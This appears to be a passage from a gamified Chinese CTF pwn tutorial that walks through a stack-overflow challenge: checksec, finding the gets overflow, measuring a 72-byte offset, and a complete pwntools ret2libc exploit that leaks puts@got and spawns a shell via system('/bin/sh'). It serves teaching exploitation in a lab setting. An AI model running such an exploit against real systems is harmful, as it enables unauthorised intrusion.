# 第 28 关 · BOSS 战一：一道栈题的完整通关节奏

## 🎬 游戏开场

BOSS 来了。这是一道真实的栈利用题,我们把前面学的技能串成一套**固定节奏**:

```
侦察 → 找洞 → 测偏移 → 定策略 → 构造 → 调试 → 拿flag
```

不管什么栈题,都按这个节奏打。一旦形成肌肉记忆,你就从"照着 exp 抄"变成了"独立通关"。

---

## 🧠 战斗流程(游戏化)

### 第一步:侦察(checksec)

```bash
checksec --file=chall
```

假设输出:

```
RELRO: Partial RELRO   → GOT可写,可考虑GOT劫持
Stack: No canary       → 无需泄露Canary,直接溢出
NX: NX enabled         → 不能执行shellcode,用ROP/ret2libc
PIE: No PIE            → 地址固定,ret2text可行
```

翻译成游戏语言:**没警报器、不能自带代码、地图固定**。最适合的策略:先找程序里有没有后门(ret2text),没有就 ret2libc。

### 第二步:找洞(运行 + 反汇编)

运行程序,发现让你输入名字。反汇编:

```bash
objdump -d -M intel chall | grep -A20 "<vuln>"
```

看到 `gets` + `char buf[64]`——栈溢出实锤。再搜后门:

```bash
nm chall | grep -i "system\|backdoor\|cheat"
strings -a -t x chall | grep "/bin/sh"
```

假设没有后门、没有 `/bin/sh`——那走 ret2libc。

### 第三步:测偏移

```bash
python3 -c "from pwn import *; print(cyclic(150))" | ./chall
gdb ./chall
(gdb) cyclic_find($rsp)   # 假设输出 72
```

偏移 = 72(64字节buf + 8字节rbp)。

### 第四步:定策略

保护 + 材料分析结论:

- NX + 无后门 → ret2libc
- No PIE → PLT/GOT 地址固定,可直接用
- Partial RELRO → GOT 可写(备用方案)

策略:**第一轮泄露 puts@got 算 libc 基址,第二轮 system("/bin/sh")**。(第 10 关的老套路)

### 第五步:构造 exp

```python
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6')
p = process('./chall')

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# 第一轮:泄露
p.sendline(b'A'*72 + p64(pop_rdi) + p64(elf.got['puts'])
           + p64(elf.plt['puts']) + p64(elf.sym['main']))
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b'\x00'))
base = leak - libc.sym['puts']
log.success('libc base: '+hex(base))

# 第二轮:gets shell
p.recv()
p.sendline(b'A'*72 + p64(pop_rdi)
           + p64(base+next(libc.search(b'/bin/sh\x00')))
           + p64(ret) + p64(base+libc.sym['system']))
p.interactive()
```

### 第六步:调试

如果失败:

- 拿不到 shell 但没崩 → 检查泄露的地址对不对、libc 版本对不对。
- 崩溃在 `movaps` → 加/减一个 `ret` 调整栈对齐。
- 直接崩 → 检查偏移、检查地址。

用 gdb 断点看栈上链子是否如预期。

### 第七步:拿 flag

```bash
$ cat flag
flag{you_beated_the_stack_boss}
```

## 📌 通关节奏总结

| 步骤 | 动作 | 工具 |
| --- | --- | --- |
| 1 侦察 | checksec | checksec |
| 2 找洞 | 运行 + 反汇编 | objdump/nm/strings |
| 3 测偏移 | cyclic pattern | pwntools + gdb |
| 4 定策略 | 保护→选招 | 你的脑子 |
| 5 构造 | 写 exp | pwntools |
| 6 调试 | 断点排查 | gdb/pwndbg |
| 7 拿flag | interactive | shell |

**这套节奏适用于所有栈题。** 把策略那一步换成 ret2text / Canary 泄露 / 栈迁移,你就有了全套栈题能力。
